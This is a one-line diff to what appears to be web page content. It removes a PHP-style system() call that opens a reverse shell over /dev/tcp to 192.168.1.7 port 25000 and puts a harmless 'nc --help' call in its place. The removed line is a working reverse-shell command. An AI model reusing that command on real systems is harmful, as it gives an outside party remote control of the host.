@@ -1,1 +1,1 @@
-<pre>system('sh -i >& /dev/tcp/192.168.1.7/25000 0>&1')</pre>
+<pre>system('nc --help')</pre>
